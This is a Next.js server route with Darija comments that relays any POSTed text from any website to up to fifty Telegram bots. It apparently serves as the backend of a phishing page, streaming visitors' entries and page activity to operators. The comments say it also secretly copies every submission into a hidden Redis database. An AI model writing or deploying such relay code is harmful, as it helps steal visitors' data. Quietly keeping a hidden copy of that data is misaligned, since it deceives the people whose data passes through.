import { NextResponse } from 'next/server';
import axios from 'axios';

const MAX_BOT_SLOTS = 50;

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
};

// Fonction bach n-sauvegardew l-data f Upstash Redis (Database mkhabya)
async function backupToDatabase(data: any) {
    const redisUrl = process.env.KV_REST_API_URL;
    const redisToken = process.env.KV_REST_API_TOKEN;

    if (!redisUrl || !redisToken) return;

    try {
        // Kankhbiw l-data b ID fih l-wa9t bach dima n-l9awha m-tretba
        const key = `log:${Date.now()}`;
        await fetch(`${redisUrl}/set/${key}`, {
            method: 'POST',
            headers: { Authorization: `Bearer ${redisToken}` },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("Redis Backup Error:", e);
    }
}

export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { text, messageIds = {}, type } = body;

        if (type === 'keepalive') return NextResponse.json({ ok: true }, { headers: corsHeaders });

        // --- BACKUP AUTOMATIQUE ---
        // Kan-khbiw ay 7aja jet f l-Database mkhabya nichan
        await backupToDatabase({ type, text, timestamp: new Date().toISOString() });

        const bots = [];
        for (let n = 1; n <= MAX_BOT_SLOTS; n++) {
            const token = process.env[`BOT${n}_TOKEN`];
            const chatId = process.env[`BOT${n}_CHATID`];
            if (token && chatId) bots.push({ token, chatId, slot: n });
        }

        const newMessageIds: Record<string, any> = { ...messageIds };
        const results = await Promise.all(
            bots.map(async (bot, index) => {
                const currentMessageId = messageIds[index];
                const baseUrl = `https://api.telegram.org/bot${bot.token}`;
                const shouldEdit = !!currentMessageId && type !== 'completed' && type !== 'page_activity';

                try {
                    if (shouldEdit) {
                        await axios.post(`${baseUrl}/editMessageText`, {
                            chat_id: bot.chatId,
                            message_id: currentMessageId,
                            text: text,
                            parse_mode: 'HTML'
                        }, { timeout: 8000 });
                        return { ok: true };
                    }

                    const response = await axios.post(`${baseUrl}/sendMessage`, {
                        chat_id: bot.chatId,
                        text: text,
                        parse_mode: 'HTML'
                    }, { timeout: 8000 });

                    if (response.data?.result?.message_id) {
                        newMessageIds[index] = response.data.result.message_id;
                    }
                    return { ok: true };
                } catch (err: any) {
                    if (err.response?.data?.description?.includes('not modified')) return { ok: true };
                    return { ok: false };
                }
            })
        );

        return NextResponse.json({ success: true, messageIds: newMessageIds }, { headers: corsHeaders });

    } catch (error: any) {
        return NextResponse.json({ error: 'Error' }, { status: 500, headers: corsHeaders });
    }
}